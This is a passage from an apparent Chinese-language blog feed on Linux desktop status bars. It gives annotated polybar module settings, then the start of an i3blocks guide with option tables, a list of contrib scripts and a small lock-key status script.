class="line"><span class="comment">; 对未知状态的网络设备启用</span></span><br><span class="line"><span class="attr">unknown-as-up</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">format-connected</span> = &lt;ramp-signal&gt; &lt;label-connected&gt;</span><br><span class="line"><span class="attr">format-disconnected</span> = &lt;label-disconnected&gt;</span><br><span class="line"></span><br><span class="line"><span class="attr">label-connected</span> =  %essid% %upspeed% %downspeed%</span><br><span class="line">label-connected-foreground = #00FFFF</span><br><span class="line"></span><br><span class="line"><span class="comment">;label-disconnected = </span></span><br><span class="line"><span class="comment">;label-disconnected-foreground = #66ffffff</span></span><br><span class="line"></span><br><span class="line"><span class="attr">ramp-signal-0</span> = </span><br><span class="line"><span class="attr">ramp-signal-1</span> = </span><br><span class="line"><span class="attr">ramp-signal-2</span> = </span><br><span class="line"><span class="attr">ramp-signal-3</span> = </span><br><span class="line"><span class="attr">ramp-signal-4</span> = </span><br><span class="line"><span class="attr">ramp-signal-5</span> = </span><br><span class="line"></span><br><span class="line">ramp-signal-0-foreground = #ff5555</span><br><span class="line">ramp-signal-1-foreground = #ff5555</span><br><span class="line">ramp-signal-2-foreground = #fba922</span><br><span class="line">ramp-signal-3-foreground = #fba922</span><br><span class="line">ramp-signal-4-foreground = #aaff77</span><br><span class="line">ramp-signal-5-foreground = #aaff77</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; ===键盘提示===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar/wiki/Module:-xkeyboard</span></span><br><span class="line"><span class="section">[module/xkeyboard]</span></span><br><span class="line"><span class="attr">type</span> = internal/xkeyboard</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; 忽略列表</span></span><br><span class="line"><span class="attr">blacklist-0</span> = scroll lock</span><br><span class="line"></span><br><span class="line"><span class="comment">; &lt;label-indicator&gt;</span></span><br><span class="line"><span class="attr">format</span> =  &lt;label-indicator&gt;</span><br><span class="line"><span class="attr">format-spacing</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">label-indicator-on-capslock</span> = </span><br><span class="line">label-indicator-off-capslock =</span><br><span class="line"><span class="comment">;label-indicator-on-numlock = 🅽</span></span><br><span class="line"><span class="comment">;label-indicator-off-numlock =</span></span><br><span class="line"></span><br><span class="line">label-indicator-on-capslock-foreground = #ff5555</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; ===音量===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar/wiki/Module:-pulseaudio</span></span><br><span class="line"><span class="section">[module/pulseaudio]</span></span><br><span class="line"><span class="attr">type</span> = internal/pulseaudio</span><br><span class="line"><span class="attr">sink</span> = alsa_output.pci<span class="number">-0000_12_00</span>.<span class="number">3</span>.analog-stereo</span><br><span class="line"><span class="attr">use-ui-max</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">interval</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="attr">format-volume</span> = &lt;ramp-volume&gt; &lt;label-volume&gt;</span><br><span class="line"></span><br><span class="line"><span class="attr">label-muted</span> = </span><br><span class="line">label-muted-foreground = #666</span><br><span class="line"></span><br><span class="line"><span class="attr">ramp-volume-0</span> = </span><br><span class="line"><span class="attr">ramp-volume-1</span> = </span><br><span class="line"><span class="attr">ramp-volume-2</span> = </span><br><span class="line"></span><br><span class="line"><span class="comment">; 左右键功能，pavucontrol 用于开关音量</span></span><br><span class="line"><span class="attr">click-right</span> = pavucontrol</span><br><span class="line"><span class="comment">; click-middle =</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; ===CPU===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar/wiki/Module:-cpu</span></span><br><span class="line"><span class="section">[module/cpu]</span></span><br><span class="line"><span class="attr">type</span> = internal/cpu</span><br><span class="line"></span><br><span class="line"><span class="comment">; 刷新间隔，默认: 1</span></span><br><span class="line"><span class="attr">interval</span> = <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line"><span class="attr">format</span> = &lt;label&gt; &lt;ramp-coreload&gt;</span><br><span class="line"></span><br><span class="line"><span class="attr">label</span> =  %percentage%%</span><br><span class="line">label-foreground = #9A32DB</span><br><span class="line"></span><br><span class="line"><span class="comment">; Spacing between individual per-core ramps</span></span><br><span class="line"><span class="attr">ramp-coreload-spacing</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">ramp-coreload-0</span> = ▁</span><br><span class="line"><span class="attr">ramp-coreload-1</span> = ▂</span><br><span class="line"><span class="attr">ramp-coreload-2</span> = ▃</span><br><span class="line"><span class="attr">ramp-coreload-3</span> = ▄</span><br><span class="line"><span class="attr">ramp-coreload-4</span> = ▅</span><br><span class="line"><span class="attr">ramp-coreload-5</span> = ▆</span><br><span class="line"><span class="attr">ramp-coreload-6</span> = ▇</span><br><span class="line"><span class="attr">ramp-coreload-7</span> = █</span><br><span class="line"></span><br><span class="line">ramp-coreload-0-foreground = #aaff77</span><br><span class="line">ramp-coreload-1-foreground = #aaff77</span><br><span class="line">ramp-coreload-2-foreground = #aaff77</span><br><span class="line">ramp-coreload-3-foreground = #aaff77</span><br><span class="line">ramp-coreload-4-foreground = #fba922</span><br><span class="line">ramp-coreload-5-foreground = #fba922</span><br><span class="line">ramp-coreload-6-foreground = #ff5555</span><br><span class="line">ramp-coreload-7-foreground = #ff5555</span><br><span class="line"></span><br><span class="line"><span class="comment">; ===内存===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar/wiki/Module:-memory</span></span><br><span class="line"><span class="section">[module/memory]</span></span><br><span class="line"><span class="attr">type</span> = internal/memory</span><br><span class="line"></span><br><span class="line"><span class="comment">; 刷新间隔，默认: 1</span></span><br><span class="line"><span class="attr">interval</span> = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="attr">format</span> = &lt;label&gt; &lt;ramp-used&gt; &lt;ramp-free&gt;</span><br><span class="line"></span><br><span class="line"><span class="attr">label</span> =  %gb_used%/%gb_free%</span><br><span class="line">label-foreground = #9A32DB</span><br><span class="line"></span><br><span class="line"><span class="comment">; 用于 &lt;ramp-used&gt;</span></span><br><span class="line"><span class="attr">ramp-used-0</span> = ▁</span><br><span class="line"><span class="attr">ramp-used-1</span> = ▂</span><br><span class="line"><span class="attr">ramp-used-2</span> = ▃</span><br><span class="line"><span class="attr">ramp-used-3</span> = ▄</span><br><span class="line"><span class="attr">ramp-used-4</span> = ▅</span><br><span class="line"><span class="attr">ramp-used-5</span> = ▆</span><br><span class="line"><span class="attr">ramp-used-6</span> = ▇</span><br><span class="line"><span class="attr">ramp-used-7</span> = █</span><br><span class="line"></span><br><span class="line">ramp-used-0-foreground = #aaff77</span><br><span class="line">ramp-used-1-foreground = #aaff77</span><br><span class="line">ramp-used-2-foreground = #aaff77</span><br><span class="line">ramp-used-3-foreground = #aaff77</span><br><span class="line">ramp-used-4-foreground = #fba922</span><br><span class="line">ramp-used-5-foreground = #fba922</span><br><span class="line">ramp-used-6-foreground = #ff5555</span><br><span class="line">ramp-used-7-foreground = #ff5555</span><br><span class="line"></span><br><span class="line"><span class="comment">; 用于 &lt;ramp-free&gt;</span></span><br><span class="line"><span class="attr">ramp-free-0</span> = ▁</span><br><span class="line"><span class="attr">ramp-free-1</span> = ▂</span><br><span class="line"><span class="attr">ramp-free-2</span> = ▃</span><br><span class="line"><span class="attr">ramp-free-3</span> = ▄</span><br><span class="line"><span class="attr">ramp-free-4</span> = ▅</span><br><span class="line"><span class="attr">ramp-free-5</span> = ▆</span><br><span class="line"><span class="attr">ramp-free-6</span> = ▇</span><br><span class="line"><span class="attr">ramp-free-7</span> = █</span><br><span class="line"></span><br><span class="line">ramp-free-0-foreground = #ff5555</span><br><span class="line">ramp-free-1-foreground = #ff5555</span><br><span class="line">ramp-free-2-foreground = #fba922</span><br><span class="line">ramp-free-3-foreground = #fba922</span><br><span class="line">ramp-free-4-foreground = #aaff77</span><br><span class="line">ramp-free-5-foreground = #aaff77</span><br><span class="line">ramp-free-6-foreground = #aaff77</span><br><span class="line">ramp-free-7-foreground = #aaff77</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; ===屏幕亮度===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar/wiki/Module:-xbacklight</span></span><br><span class="line"><span class="section">[module/backlight]</span></span><br><span class="line"><span class="attr">type</span> = internal/backlight</span><br><span class="line"></span><br><span class="line"><span class="comment">; 使用命令查询到设备文件:</span></span><br><span class="line"><span class="comment">; ls -1 /sys/class/backlight/</span></span><br><span class="line"><span class="attr">card</span> = intel_backlight</span><br><span class="line"></span><br><span class="line"><span class="comment">; 滚轮调节亮度</span></span><br><span class="line"><span class="comment">; sudo chown video /sys/class/backlight/intel_backlight/brightness</span></span><br><span class="line"><span class="comment">; sudo chmod g+w /sys/class/backlight/intel_backlight/brightness</span></span><br><span class="line"><span class="comment">; usermod -a -G video eonun</span></span><br><span class="line"><span class="comment">; Default: false</span></span><br><span class="line"><span class="attr">enable-scroll</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">format</span> = &lt;ramp&gt; &lt;label&gt;</span><br><span class="line"></span><br><span class="line"><span class="attr">label</span> = %percentage%%</span><br><span class="line"></span><br><span class="line"><span class="comment">; 用于 &lt;ramp&gt;</span></span><br><span class="line"><span class="attr">ramp-0</span> = 🌕</span><br><span class="line"><span class="attr">ramp-1</span> = 🌔</span><br><span class="line"><span class="attr">ramp-2</span> = 🌓</span><br><span class="line"><span class="attr">ramp-3</span> = 🌒</span><br><span class="line"><span class="attr">ramp-4</span> = 🌑</span><br><span class="line"></span><br><span class="line"><span class="comment">; 用于 &lt;bar&gt;</span></span><br><span class="line"><span class="attr">bar-width</span> = <span class="number">10</span></span><br><span class="line"><span class="attr">bar-indicator</span> = |</span><br><span class="line"><span class="attr">bar-fill</span> = -</span><br><span class="line"><span class="attr">bar-empty</span> = -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; ===日期时间===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar/wiki/Module:-date</span></span><br><span class="line"><span class="section">[module/date]</span></span><br><span class="line"><span class="attr">type</span> = internal/date</span><br><span class="line"></span><br><span class="line"><span class="comment">; 更新间隔, 默认: 1.0</span></span><br><span class="line"><span class="attr">interval</span> = <span class="number">1.0</span></span><br><span class="line"><span class="attr">format</span> = &lt;label&gt;</span><br><span class="line"></span><br><span class="line"><span class="attr">date</span> = %Y-%m-%d%</span><br><span class="line"><span class="attr">time</span> = %H:%M</span><br><span class="line"></span><br><span class="line"><span class="comment">; 另一中格式</span></span><br><span class="line"><span class="attr">date-alt</span> = %A, %d %B %Y</span><br><span class="line"><span class="attr">time-alt</span> = %H:%M:%S</span><br><span class="line"></span><br><span class="line"><span class="attr">label</span> =  %date%  %time%</span><br><span class="line"><span class="attr">label-font</span> = <span class="number">1</span></span><br><span class="line">label-foreground = #eefafafa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; ===电源提示===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar/wiki/Module:-battery</span></span><br><span class="line"><span class="section">[module/battery]</span></span><br><span class="line"><span class="attr">type</span> = internal/battery</span><br><span class="line"></span><br><span class="line"><span class="comment">; 电量大于 99% 显示充电完成</span></span><br><span class="line"><span class="attr">full-at</span> = <span class="number">99</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 使用以下命令列出电池和适配器:</span></span><br><span class="line"><span class="comment">; ls -1 /sys/class/power_supply/</span></span><br><span class="line"><span class="attr">battery</span> = BAT1</span><br><span class="line"><span class="attr">adapter</span> = ACAD</span><br><span class="line"></span><br><span class="line"><span class="attr">poll-interval</span> = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 时间过格式,默认: %H:%M:%S</span></span><br><span class="line"><span class="attr">time-format</span> = %H:%M</span><br><span class="line"></span><br><span class="line"><span class="comment">; 充电</span></span><br><span class="line"><span class="attr">format-charging</span> =  &lt;animation-charging&gt; &lt;label-charging&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">; 放电</span></span><br><span class="line"><span class="attr">format-discharging</span> =  &lt;animation-discharging&gt; &lt;label-discharging&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">; 充电完成</span></span><br><span class="line"><span class="comment">;format-full = &lt;ramp-capacity&gt; &lt;label-full&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 充电状态</span></span><br><span class="line"><span class="attr">label-charging</span> =  %percentage%(%time%)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; 放电状态</span></span><br><span class="line"><span class="attr">label-discharging</span> = %percentage%(%time%)</span><br><span class="line"></span><br><span class="line"><span class="comment">;充电完成</span></span><br><span class="line"><span class="attr">label-full</span> =  %percentage%</span><br><span class="line">label-full-foreground = #aaff77</span><br><span class="line"></span><br><span class="line"><span class="attr">ramp-capacity-0</span> = </span><br><span class="line"><span class="attr">ramp-capacity-1</span> = </span><br><span class="line"><span class="attr">ramp-capacity-2</span> = </span><br><span class="line"><span class="attr">ramp-capacity-3</span> = </span><br><span class="line"><span class="attr">ramp-capacity-4</span> = </span><br><span class="line"></span><br><span class="line"><span class="attr">bar-capacity-width</span> = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">animation-charging-0</span> = </span><br><span class="line"><span class="attr">animation-charging-1</span> = </span><br><span class="line"><span class="attr">animation-charging-2</span> = </span><br><span class="line"><span class="attr">animation-charging-3</span> = </span><br><span class="line"><span class="attr">animation-charging-4</span> = </span><br><span class="line"><span class="comment">; 动画帧率(毫秒)</span></span><br><span class="line"><span class="attr">animation-charging-framerate</span> = <span class="number">750</span></span><br><span class="line"></span><br><span class="line"><span class="attr">animation-discharging-0</span> = </span><br><span class="line"><span class="attr">animation-discharging-1</span> = </span><br><span class="line"><span class="attr">animation-discharging-2</span> = </span><br><span class="line"><span class="attr">animation-discharging-3</span> = </span><br><span class="line"><span class="attr">animation-discharging-4</span> = </span><br><span class="line"><span class="comment">; 动画帧率(毫秒)</span></span><br><span class="line"><span class="attr">animation-discharging-framerate</span> = <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; ===USB===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar-scripts/tree/master/polybar-scripts/system-usb-udev</span></span><br><span class="line"><span class="section">[module/system-usb-udev]</span></span><br><span class="line"><span class="attr">type</span> = custom/script</span><br><span class="line"><span class="attr">exec</span> = ~/.config/polybar/scripts/system-usb-udev.sh</span><br><span class="line"><span class="attr">tail</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">click-left</span> = ~/.config/polybar/scripts/system-usb-udev.sh --mount &amp;</span><br><span class="line"><span class="attr">click-right</span> = ~/.config/polybar/scripts/system-usb-udev.sh --unmount &amp;</span><br></pre></td></tr></table></figure>
<h1 id="使用已有的-polybar-主题配置"><a href="#使用已有的-polybar-主题配置" class="headerlink" title="使用已有的 polybar 主题配置"></a>使用已有的 polybar 主题配置</h1><p><a href="https://github.com/Yucklys/polybar-nord-theme">https://github.com/Yucklys/polybar-nord-theme</a></p>
<p><a href="https://github.com/adi1090x/polybar-themes">https://github.com/adi1090x/polybar-themes</a></p>
<p><a href="https://github.com/ryanoasis/nerd-fonts">nerd 字体(各类字体的集合)</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://guyueshui.github.io/post/polybar-%E7%9A%84%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/">Polybar 的配置笔记</a></p>
<p><a href="https://blog.csdn.net/Liukairui/article/details/108060500#t49">Polybar的主题配置</a></p>
]]></content>
      <categories>
        <category>i3</category>
      </categories>
      <tags>
        <tag>i3</tag>
      </tags>
  </entry>
  <entry>
    <title>i3block配置</title>
    <url>/posts/e91fcb84/</url>
    <content><![CDATA[<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><ul>
<li><p><code>$XDG_CONFIG_HOME/i3blocks/config</code> (<code>~/.config/i3blocks/config</code>)</p>
</li>
<li><p><code>/.i3blocks.conf</code></p>
</li>
<li><p><code>$XDG_CONFIG_DIRS/i3blocks/config</code> (<code>/etc/xdg/i3blocks/config</code>)</p>
</li>
<li><p><code>/etc/i3blocks.conf</code></p>
</li>
</ul>
<a id="more"></a>
<h1 id="配置选项"><a href="#配置选项" class="headerlink" title="配置选项"></a>配置选项</h1><div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>script]</code></td>
<td>配置项名</td>
</tr>
<tr>
<td><code>align=</code></td>
<td>对齐</td>
</tr>
<tr>
<td><code>color=</code></td>
<td>颜色</td>
</tr>
<tr>
<td><code>command=</code></td>
<td>指令</td>
</tr>
<tr>
<td><code>format=</code></td>
<td>样式</td>
</tr>
<tr>
<td><code>full_text=</code></td>
<td>全文</td>
</tr>
<tr>
<td><code>instance=</code></td>
<td>实例</td>
</tr>
<tr>
<td><code>interval=</code></td>
<td>间隔时</td>
</tr>
<tr>
<td><code>label=</code></td>
<td>标签</td>
</tr>
<tr>
<td><code>markup=</code></td>
<td>标记</td>
</tr>
<tr>
<td><code>min_width=</code></td>
<td>最小宽度</td>
</tr>
<tr>
<td><code>name=</code></td>
<td>名称</td>
</tr>
<tr>
<td><code>signal=</code></td>
<td>信号</td>
</tr>
<tr>
<td><code>short_text=</code></td>
<td>短文</td>
</tr>
<tr>
<td><code>separator=</code></td>
<td>分隔符</td>
</tr>
<tr>
<td><code>separator_block_width=</code></td>
<td>分隔块宽度</td>
</tr>
<tr>
<td><code>urgent=</code></td>
<td>紧急</td>
</tr>
</tbody>
</table>
</div>
<p><code>$SCRIPT_DIR</code>是脚本位置的通用替代，需要修改为脚本位置，也可将<code>$SCRIPT_DIR</code>环境变量从i3配置传递给i3block ：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bar &#123;</span><br><span class="line">  status_command SCRIPT_DIR&#x3D;~&#x2F;.config&#x2F;i3blocks i3blocks</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>然后i3block的配置中就可用<code>command=$SCRIPT_DIR/example/example.ext</code> 指定脚本路径了。</p>
<h1 id="官方配置脚本列表"><a href="#官方配置脚本列表" class="headerlink" title="官方配置脚本列表"></a>官方配置脚本列表</h1><p>官方配置脚本地址:<code>https://github.com/vivien/i3blocks-contrib</code></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>脚本块</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/afs">afs</a></td>
<td>显示AFS目录的使用信息</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/apt-upgrades">apt-upgrades</a></td>
<td>用apt查询系统升级，显示结果</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/arch-update">arch-update</a></td>
<td>用yaourt查询AUR升级，显示结果</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/aur-update">aur-update</a></td>
<td>查询AUR升级，显示结果</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/backlight">backlight</a></td>
<td>显示由 <code>xbacklight</code> 提供的屏幕亮度值</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/bandwidth">bandwidth</a></td>
<td>显示带宽信息（默认bash版本）</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/bandwidth2">bandwidth2</a></td>
<td>显示带宽信息（C版）</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/bandwidth3">bandwidth3</a></td>
<td>显示带宽信息（另一个bash版本）</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/battery-poly">battery-poly</a></td>
<td>显示多电池信息</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/battery">battery</a></td>
<td>显示电池信息</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/battery2">battery2</a></td>
<td>漂亮的电池信息</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/batterybar">batterybar</a></td>
<td>以条形图形式显示电池信息</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/calendar">calendar</a></td>
<td>当前日期/时间，单击查看日历</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/cpu_usage">cpu_usage</a></td>
<td>显示当前的CPU使用率</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/cpu_usage2">cpu_usage2</a></td>
<td>显示当前的CPU使用率（C版）</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/disk">disk</a></td>
<td>显示给定目录的磁盘使用情况（已用空间）</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/disk-io">disk-io</a></td>
<td>监视磁盘读写</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/docker">docker</a></td>
<td>显示Docker容器和容器IP的数量</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/dunst">dunst</a></td>
<td>使用简单的请勿打扰按钮切换Dunst通知</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/email">email</a></td>
<td>显示未读的IMAP消息数</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/essid">essid</a></td>
<td>显示连接的wifi ESSID（dep：iwconfig，perl）</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/gpu-load">gpu-load</a></td>
<td>显示NVIDIA GPU的负载</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/go">go</a></td>
<td>显示当前安装的Go版本</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/iface">iface</a></td>
<td>显示网络接口IP /状态</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/kbdd_layout">kbdd_layout</a></td>
<td>使用dbus和kbdd显示键盘布局</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/keyindicator">keyindicator</a></td>
<td>显示capslock（大小写）和numlock（小键盘）的状态</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/key_layout">key_layout</a></td>
<td>使用setxkbmap显示当前的键盘布局</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/key_light">key_light</a></td>
<td>控制键盘背光</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/kubernetes">kubernetes</a></td>
<td>显示kubernetes当前上下文和名称空间</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/load_average">load_average</a></td>
<td>显示系统1分钟平均负载</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/mediaplayer">mediaplayer</a></td>
<td>使用Playerctl的通用媒体播放器状态/控件</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/memory">memory</a></td>
<td>显示内存或交换空间使用情况</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/monitor_manager">monitor_manager</a></td>
<td>管理显示器的开/关，分辨率，扩展，克隆</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/nm-vpn">nm-vpn</a></td>
<td>使用网络管理器显示VPN状态</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/openvpn">openvpn</a></td>
<td>显示openvpn状态</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/rofi-calendar">rofi-calendar</a></td>
<td>当前日期/时间，并使用rofi单击以获取日历</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/shutdown_menu">shutdown_menu</a></td>
<td>使用rofi或zenity的关机菜单（关机，重新启动，注销，锁定等）</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/tahoe-lafs">tahoe-lafs</a></td>
<td>显示tahoe-lafs网格的状态</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/temperature">temperature</a></td>
<td>使用lm传感器显示系统温度</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/time">time</a></td>
<td>显示当前日期/时间，然后单击以更改时区</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/ssid">ssid</a></td>
<td>显示连接的wifi SSID（默认值：iw，awk）</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/usb">usb</a></td>
<td>显示已连接的USB存储设备信息</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/volume">volume</a></td>
<td>显示当前系统音量（默认）</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/volume-pulseaudio">volume-pulseaudio</a></td>
<td>显示漂亮的系统音量，用于PulseAudio</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/wifi">wifi</a></td>
<td>以百分比显示您的wifi连接强度</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/wlan-dbm">wlan-dbm</a></td>
<td>以dBm或百分比显示wifi接口连接质量</td>
</tr>
<tr>
<td><a href="https://github.com/vivien/i3blocks-contrib/blob/master/ytdl-mpv">ytdl-mpv</a></td>
<td>使用youtube-dl从剪贴板播放youtube视频</td>
</tr>
</tbody>
</table>
</div>
<p><code>keystatus</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">TYPE=<span class="string">&quot;<span class="variable">$&#123;BLOCK_INSTANCE:-caps&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">lockLine=$(xset -q | grep <span class="string">&quot;Num Lock&quot;</span>)</span><br><span class="line"></span><br><span class="line">capsLock=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;lockLine&#125;</span>&quot;</span> | awk -F <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>)</span><br><span class="line">numLock=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;lockLine&#125;</span>&quot;</span> | awk -F <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $8&#125;&#x27;</span>)</span><br><span class="line">scrollLock=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;lockLine&#125;</span>&quot;</span> | awk -F <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $12&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;TYPE&#125;</span>&quot;</span> == <span class="string">&quot;caps&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  checkLock=<span class="string">&quot;<span class="variable">$&#123;capsLock&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$&#123;TYPE&#125;</span>&quot;</span> == <span class="string">&quot;num&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  checkLock=<span class="string">&quot;<span class="variable">$&#123;numLock&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$&#123;TYPE&#125;</span>&quot;</span> == <span class="string">&quot;scroll&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  checkLock=<span class="string">&quot;<span class="variable">$&#123;scrollLock&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;checkLock&#125;</span>&quot;</span> == <span class="string">&quot;on&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;on&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h1 id="详细配置"><a href="#详细配置" class="headerlink" title="详细配置"></a>详细配置</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># i3blocks config file</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间日期</span></span><br><span class="line"><span class="comment"># 安装yad、xdotool</span></span><br><span class="line">[calendar]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/calendar</span><br><span class="line">interval=15</span><br><span class="line">color=<span class="string">&quot;#FF33CC&quot;</span></span><br><span class="line">LABEL=</span><br><span class="line">DATEFMT=+%b%d 星期%a  %H:%M</span><br><span class="line"><span class="comment"># SHORTFMT=+%H:%M:%S</span></span><br><span class="line">HEIGHT=530</span><br><span class="line">WIDTH=355</span><br><span class="line"></span><br><span class="line"><span class="comment"># WiFi</span></span><br><span class="line">[wifi]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/wifi</span><br><span class="line">label=</span><br><span class="line">INTERFACE=wlp3s0</span><br><span class="line">interval=60</span><br><span class="line"></span><br><span 